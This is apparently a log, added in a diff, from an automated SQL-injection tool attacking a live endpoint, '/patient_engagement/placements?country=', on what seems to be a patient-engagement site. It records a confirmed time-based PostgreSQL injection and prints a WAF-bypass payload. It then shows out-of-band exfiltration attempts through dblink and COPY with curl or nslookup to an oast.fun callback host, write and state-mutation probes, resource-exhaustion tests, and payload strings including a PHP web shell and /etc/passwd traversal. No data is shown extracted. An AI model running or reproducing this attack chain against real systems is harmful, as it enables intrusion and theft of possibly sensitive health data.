+    [T-timing] [PostgreSQL] req#436 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#437)
+    [T-timing] [PostgreSQL] req#437 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#438)
+    [T-timing] [PostgreSQL] req#438 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#439)
+    [T-timing] [PostgreSQL] req#439 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#440)
+    [T-timing] [PostgreSQL] req#440 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#441)
+    [T-timing] [PostgreSQL] req#441 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#442)
+    [T-timing] [PostgreSQL] req#442 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#443)
+    [T-timing] [PostgreSQL] req#443 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#444)
+    [T-timing] [PostgreSQL] req#444 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#445)
+    [T-timing] [PostgreSQL] req#445 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#446)
+    [T-timing] [PostgreSQL] req#446 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#447)
+    [T-timing] [PostgreSQL] req#447 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#448)
+    [T-timing] [PostgreSQL] req#448 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#449)
+    [T-timing] [PostgreSQL] req#449 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#450)
+    [T-timing] [PostgreSQL] req#450 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#451)
+    [T-timing] [PostgreSQL] req#451 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#452)
+    [T-timing] [PostgreSQL] req#452 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#453)
+    [T-timing] [PostgreSQL] req#453 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#454)
+    [T-timing] [PostgreSQL] req#454 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#455)
+    [T-timing] [PostgreSQL] req#455 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#456)
+    [T-timing] [PostgreSQL] req#456 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#457)
+    [T-timing] [PostgreSQL] req#457 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#458)
+    [T-timing] [PostgreSQL] req#458 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#459)
+    [T-timing] [PostgreSQL] req#459 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#460)
+    [T-timing] [PostgreSQL] req#460 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#461)
+    [T-timing] [PostgreSQL] req#461 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#462)
+    [T-timing] [PostgreSQL] req#462 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#463)
+    [T-timing] [PostgreSQL] req#463 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#464)
+    [T-timing] [PostgreSQL] req#464 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#465)
+    [T-timing] [PostgreSQL] req#465 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#466)
+    [T-timing] [PostgreSQL] req#466 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#467)
+    [T-timing] [PostgreSQL] req#467 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#468)
+    [T-timing] [PostgreSQL] req#468 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#469)
+    [T-timing] [PostgreSQL] req#469 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#470)
+    [T-timing] [PostgreSQL] req#470 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#471)
+    [T-timing] [PostgreSQL] req#471 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#472)
+    [T-timing] [PostgreSQL] req#472 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#473)
+    [T-timing] [PostgreSQL] req#473 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#474)
+    [T-timing] [PostgreSQL] req#474 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#475)
+    [T-timing] [PostgreSQL] req#475 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#476)
+    [T-timing] [PostgreSQL] req#476 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#477)
+    [T-timing] [PostgreSQL] req#477 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#478)
+    [T-timing] [PostgreSQL] req#478 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#479)
+    [T-timing] [PostgreSQL] req#479 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#480)
+    [T-timing] [PostgreSQL] req#480 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#481)
+    [T-timing] [PostgreSQL] req#481 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#482)
+    [T-timing] [PostgreSQL] req#482 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#483)
+    [T-timing] [PostgreSQL] req#483 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#484)
+    [T-timing] [PostgreSQL] req#484 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#485)
+    [T-timing] [PostgreSQL] req#485 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#486)
+    [T-timing] [PostgreSQL] req#486 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#487)
+    [T-timing] [PostgreSQL] req#487 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#488)
+    [T-timing] [PostgreSQL] req#488 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#489)
+    [T-timing] [PostgreSQL] req#489 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#490)
+    [T-timing] [PostgreSQL] req#490 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] testing 'PostgreSQL header time-based' (param='country' req#491)
+    [T-timing] [PostgreSQL] req#491 elapsed=323ms threshold=1700ms baseline=200ms  elevated
+[*] [diag] _try_technique: tech=TH dbms=PostgreSQL templates=2876 → testing 575 payloads
+[*] testing 'PostgreSQL header time-based' (param='country' req#492)
+    [T-timing] [PostgreSQL] req#492 elapsed=323ms threshold=440ms baseline=200ms  elevated
+[*] [TECHNIQUE-22] PostgreSQL: 99 consecutive WAF blocks — rotating to next DBMS (TECHNIQUE-27 adaptive)
+[*] ├─ [2/10] PostgreSQL › Timebased  │ tech=HQ   │ 572 base payloads (2876 expanded)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#493)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#494)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#495)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#496)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#497)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#498)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#499)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#500)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#501)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#502)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#503)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#504)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#505)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#506)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#507)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#508)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#509)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#510)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#511)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#512)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#513)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#514)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#515)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#516)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#517)
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#518)
+    [HQ-timing] [PostgreSQL] req#503 elapsed=315ms threshold=320ms baseline=200ms  elevated
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#519)
+    [HQ-timing] [PostgreSQL] req#504 elapsed=307ms threshold=320ms baseline=200ms  elevated
+[*] testing 'PostgreSQL heavy query (compute)' (param='country' req#520)
+    [HQ-timing] [PostgreSQL] req#505 elapsed=337ms threshold=320ms baseline=200ms  HIT
+    [HQ-confirm] fp2=316ms pass=True
+    [HQ-clean] clean=336ms  fast (confirmed)
+    [HQ-multi] probe 3/5: 316ms  slow (confirmed) (3/4)
+    [HQ-multi] probe 4/5: 330ms  slow (confirmed) (4/4)
+    [HQ-multi] probe 5/5: 326ms  slow (confirmed) (5/4)
+[!!] SQL INJECTION CONFIRMED [HQ] PostgreSQL (timing multi-probe early: 5/5 probes slow) — starting extraction
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[*] [MultiVote] Param 'country' voted confidence: 95% (votes: {'HQ': 0.95})
+
+[!!] SQL injection confirmed!
+    Parameter : 'country'
+    URL       : /patient_engagement/placements?country=fr&variant=desktop
+    Technique : HQ
+    DBMS      : PostgreSQL
+    Bypass    : space2comment
+    Confidence: 78%
+    Payload   : 'AND (WITH /**/\r\nt  AS (SEL/*!54233*/ECT\t /*!60000*/ (2*1)>0x1::int) /**/ SelecT\t'
+    Requests  : 510
+
+[+] Vulnerability confirmed  param='country' technique=HQ dbms=PostgreSQL
+[*] Injection confirmed on 'country'  launching extraction — all scanning stopped
+[*] [Extraction] _extraction_first running: owner=True active=True param='country'
+[*] Extraction started for 'country'
+[+] Injection found via GET method!
+[*] Running PCV on HQ detection...
+[*]   [PCV] Computed exact payload on-the-fly (covers all techniques/DBMSes/surfaces)
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): skipped (timing tech — no probe needed)
+[*]     Check E (PostgreSQL SQL): skipped (timing payload in detection (SLEEP/pg_sleep/WAITFOR — body never changes))
+[*]     Check B (detection payload proportional): FAIL  half=250ms double=224ms base=267ms (not proportional)
+[+] [Novel-2] Micro-timing sample 1/20...
+[+] [V25-Extract] Inline timing oracle wired (tech='HQ', sleep=3.0s) — extraction can proceed despite oracle calibration failure
+[+] --- Auto-extraction starting ---
+[+] [TimeBasedExtract] Time-based detection - using dedicated extraction
+[+] [TimeBasedExtract] No data extracted via timing
+[+] [Inference] Detection payload: AND (WITH t AS (SEL ECT (2*1)>0x1::int) SelecT cASe whEN (SeLect * FRO
+[+] [Inference] DBMS: PostgreSQL | Tamper chain: ['pg_dollar_quote', 'pg_cast_bypass', 'json_unicode_escape']
+[+] [Inference] Template (timing-boolean-replace): AND (WITH t AS (SEL ECT (2*1)>0x1::int) SelecT cASe whEN [INFERENCE] tHEN pg_sle
+[+] [Inference] Using confirmed detection sleep=0.100s for extraction (may floor to 0.3s if margin insufficient)
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cooling down 5s before calibration...
+[+] [Novel-2] Micro-timing sample 6/20...
+[+] [Inference] Calibrating with detection template (delay=0.1s)...
+[+] [Inference] Calibration 1: TRUE=1340ms FALSE=301ms margin=1038ms
+[+] [Inference] Best margin: 1038ms
+[+] [Inference] Body length differs but too small (175B = 0.1% on 136849B page)  dynamic noise, not oracle
+[+] [Inference] Body length differs but too small (96B = 0.1% on 136842B page)  dynamic noise, not oracle
+[+] [Inference] Body length differs but too small (33B = 0.0% on 136684B page)  dynamic noise, not oracle
+[+] [Inference] Boolean oracle not detected after 3 attempts
+[+] [Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...
+[+] [Novel-2] Micro-timing sample 11/20...
+[+] [Novel-2] Micro-timing sample 16/20...
+[*]     Check B (timing canary): FAIL (all fallbacks tried)
+[*]   [PCV] Result: REJECTED  heavy-query (HQ) requires timing proof, body canary alone insufficient
+[!] Secondary PCV FAILED for [HQ] but injection already confirmed by inline PCV — keeping result (secondary failure may be CDN/WAF transient or error-page FP guard)
+[+] Minimising payload: 207 chars  ?
+[+] [Inference] Wasserstein mean=0.000 n=12 (threshold=0.25)
+[+] [Inference]  Threshold=821ms (margin=1038ms)
+[+] [Inference] Template confirmed by calibration (margin=1038ms ≥ min=80ms)  skipping re-test
+[+] [Inference] Error probe body differs but too small (218B = 0.2% on 136917B page)  noise
+[+] [Inference] Operator '>' blocked  trying alternatives
+[+] [Inference] All comparison operators blocked  using BITWISE extraction (& and = only)
+[+] [Inference] Standard extraction empty — trying regex binary search
+[+] [Inference] Standard extraction empty — trying LIKE prefix
+[+] [Inference]  HEADER oracle: content-length='136699' vs '136666'
+[+] [Inference] No usable data extracted via boolean/timing inference
+[+] [Inference] No data extracted  trying side channels
+[+] [SchemaEnumV18] Inference returned no DB name — activating SchemaEnumeratorV18 enhanced enumerator
+[+] [SideChannel] DNS OOB extraction  dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [SideChannel] Advanced DNS: dblink
+[+] [SideChannel] Advanced DNS: copy_nslookup
+[+] [SideChannel] Advanced DNS: copy_curl
+[+] [SideChannel] HTTP exfil: copy_curl
+[+] [SideChannel] HTTP exfil: copy_wget
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[+] [SideChannel] No side channels  trying DIRECT extraction before MSE
+[+] [Direct] Detection payload: AND (WITH t AS (SEL ECT (2*1)>0x1::int) SelecT cASe whEN (Se
+[+] [Direct] Template: AND (WITH t AS (SEL ECT (2*1)>0x1::int) SelecT cASe whEN {cond} tHEN p
+[+] [Direct] Calibrating (8s cooldown, then 2 probes)...
+[+] Minimised: 207  160 chars (28 probes)
+[+]  'country': HQ [WHERE_STRING] bypass=direct conf=78%
+[+] [PATCH-5] Second injection point param='country' technique=HQ dbms=PostgreSQL — logging only, extraction already active/done (Req 5).
+[!] [ExtractionGuard] Extraction already running on 'country@PostgreSQL'  blocking parallel extraction of 'country' (Issue 5 fix: never two extractions)
+[+] [*] Skipping extended surfaces  injection already confirmed
+[*] Waiting for extraction to complete...
+[+] [Direct] true=3279ms false=347ms margin=2932ms
+[+] [Direct] Viable! thresh=1813ms delay=3.0s
+[+] [Direct] Primary db expr empty, trying WAF-bypass alternative
+[+] [Direct] Primary user expr empty, trying WAF-bypass alternative
+[+] [Direct] ASCII extraction empty  trying nofunc prefix comparison
+[+] [Direct] Falling back to MSE timing
+[+] [Novel]  Starting 7 novel WAF bypass extraction techniques 
+[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)
+[+] [Novel-1] Sending clean baseline probe...
+[+] [Novel-1] Testing WAF trigger 1/7: <script>alert(1)</script>...
+[+] [Novel-1] Testing WAF trigger 2/7: ../../../../../../etc/passwd...
+[+] [Novel-1] Testing WAF trigger 3/7: <img src=x onerror=alert(1)>...
+[+] [Novel-1] Testing WAF trigger 4/7: javascript:alert(1)...
+[+] [Novel-1] Testing WAF trigger 5/7: UNION SELECT FROM...
+[+] [Novel-1] Testing WAF trigger 6/7: <?php system($_GET['c']); ?>...
+[+] [Novel-1] Testing WAF trigger 7/7: ${7*7}...
+[+] [Novel]  No WAF trigger produced different response
+[+] [Novel] Technique 2: Micro-timing (statistical sub-threshold delays)
+[+] [Novel-2] Micro-timing sample 1/10...
+[+] [Novel-2] Micro-timing sample 6/10...
+[+] [Novel]  Micro-timing oracle viable (p<0.05)
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel]  Micro-timing timeout (60s) for user — moving on
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel-2] Micro-timing sample 6/8...
+[+] [Novel-2] Micro-timing sample 1/8...
+[+] [Novel]  Micro-timing timeout (57s) for database — moving on
+[+] [Novel]  Micro-timing global budget exhausted — stopping all fields
+[+] [Novel] Technique 3: Resource bomb (asymmetric computation)
+[+] [Novel]  Resource bomb not viable (margin=-28ms)
+[+] [Novel] Technique 4: Alternative DNS exfil vectors
+[+] [Novel] DNS vector 'dblink' fired for user  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for user  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for user  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'copy_curl' fired for user  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'lo_export' fired for user  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'dblink' fired for database  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for database  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for database  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'copy_curl' fired for database  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'lo_export' fired for database  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'dblink' fired for version  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for version  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for version  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'copy_curl' fired for version  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'lo_export' fired for version  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] Technique 5: Connection pool exhaustion oracle
+[+] [Novel] Connection exhaustion test: status after lock = 400
+[+] [Novel] Technique 6: Write-then-read (two-stage)
+[+] [Novel]  Write-then-read response: <html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></cente
+[+] [Novel] Technique 7: Response splitting via config/session vars
+[+] [Novel] Technique 8: Conditional error type oracle
+[+] [Novel]  Error type 'constraint' viable: TRUE557 FALSE155 (length)
+[Novel] database: oracle sanity FAILED (always-false condition returned True) — oracle is corrupt (WAF challenge page matches true_sig); aborting extraction
+[+] [Novel] Technique 9: Prepared statement keyword bypass
+[+] [Novel] Prepared statements sent for database
+[+] [Novel] Prepared statements sent for version
+[+] [Novel] Technique 10: Application state mutation
+[+] [Novel] State mutation 'table_write' sent for user
+[+] [Novel] State mutation 'comment_inject' sent for user
+[+] [Novel] State mutation 'sequence_name' sent for user
+[+] [Novel] State mutation 'table_write' sent for database
+[+] [Novel] State mutation 'comment_inject' sent for database
+[+] [Novel] State mutation 'sequence_name' sent for database
+[+] [Novel] State mutation 'table_write' sent for version
+[+] [Novel] State mutation 'comment_inject' sent for version
+[+] [Novel] State mutation 'sequence_name' sent for version
+[+] [Novel] Technique 11: TCP/response size inflation
+[+] [Novel]  TCP inflation viable: inflated=557 normal=155
+[+] [Novel] Technique 12: Nested/multi-layer encoding bypass
+[+] [Novel] Technique 13: Conditional redirect detection
+[+] [Novel]  No redirect differentiation
+[+] [Novel] Technique 14: Cache key manipulation
+[+] [Novel]  Cache oracle: hit=253ms miss=315ms margin=62ms
+[+] [Novel]  FIX #5: EXPLOITING CACHE ORACLE 
+[+] [Novel] Using cache timing for data extraction (margin=62ms)
+[+] [Novel] Cache threshold: 284ms (baseline=253ms, margin=62ms)
+[+] [Novel] Cache oracle validation: TRUE=1265ms(status=400) FALSE=237ms(status=400) threshold=284ms
+[+] [Novel] Cache oracle validation probes WAF-blocked (status 400/400) — proceeding with extraction (bypass technique in actual extraction may succeed)
+[+] [Novel] Cache oracle rate-limited — stopping extraction
+[+] [Novel] Cache extraction incomplete or failed
+[+] [Novel] Technique 15: CHR() keyword bypass
+[+] [Novel] CHR() bypass sent for version
+[+] [SideChannel]  Extracting via side channels 
+[SideChannel] Auto-registered OOB domain: dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[SideChannel] DNS OOB: version()  dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[SideChannel] Sending 5 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=429 (338ms) 
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=429 (1330ms) 
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=429 (316ms) 
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=429 (365ms) 
+[SideChannel]   pg_notify: pg_notify (needs listener)
+[SideChannel]     status=429 (1348ms) 
+[SideChannel] Polling callback server for DNS interactions (30s)...
+[SideChannel] No OOB callback received after 30s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.dcxefnvzcedmzbelqrzi2mqtjwbwfc 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: current_catalog  dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[SideChannel] Sending 5 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=429 (347ms) 
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=429 (408ms) 
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=429 (372ms) 
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=429 (335ms) 
+[SideChannel]   pg_notify: pg_notify (needs listener)
+[SideChannel]     status=429 (392ms) 
+[SideChannel] Polling callback server for DNS interactions (30s)...
+[SideChannel] No OOB callback received after 30s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.dcxefnvzcedmzbelqrzi2mqtjwbwfc 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: current_user  dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[SideChannel] Sending 5 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=429 (320ms) 
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=429 (348ms) 
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=429 (325ms) 
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=429 (467ms) 
+[SideChannel]   pg_notify: pg_notify (needs listener)
+[SideChannel]     status=429 (442ms) 
+[SideChannel] Polling callback server for DNS interactions (30s)...
+[SideChannel] No OOB callback received after 30s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.dcxefnvzcedmzbelqrzi2mqtjwbwfc 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[+] [SideChannel]  Side-channel found no data  MSE will try next 
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=479ms)...
+[MSE]   untampered: AND (WITH T AS (SEL ECT (2*1)>0X1::INT) SELECT CASE WHEN (SE...
+[MSE]  Testing 6 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]   err(div0): err429/136883B ok429/136731B
+[MSE]   error_oracle(div0):  diff=size
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]  error_oracle basic validation FAILED (1=1True, 1=2True)
+[MSE] 0/3 oracles available: []
+[!] [_extract_str] mse_boolean oracle failed sanity (1=1→False, 1=2→False); discarding
+[!] [_extract_str] No oracle available for SQL: 'SELECT version()' (ConditionalErrorOracle not calibrated and MSE not wired). Extraction will return empty string.  Check that oracle calibration ran successfully.
+[!] [Extract] No boolean oracle available for 'SELECT version()...'
+    → extraction impossible without a working oracle.
+    → Ensure ConditionalErrorOracle calibrated successfully.
+[!] [_extract_str] mse_boolean oracle failed sanity (1=1→False, 1=2→False); discarding
+[!] [_extract_str] No oracle available for SQL: "SELECT (json_build_object('v',version()))->>'v'" (ConditionalErrorOracle not calibrated and MSE not wired). Extraction will return empty string.  Check that oracle calibration ran successfully.
+[!] [Extract] No boolean oracle available for 'SELECT (json_build_object('v',version())...'
+    → extraction impossible without a working oracle.
+    → Ensure ConditionalErrorOracle calibrated successfully.
+[!] [_extract_str] mse_boolean oracle failed sanity (1=1→False, 1=2→False); discarding
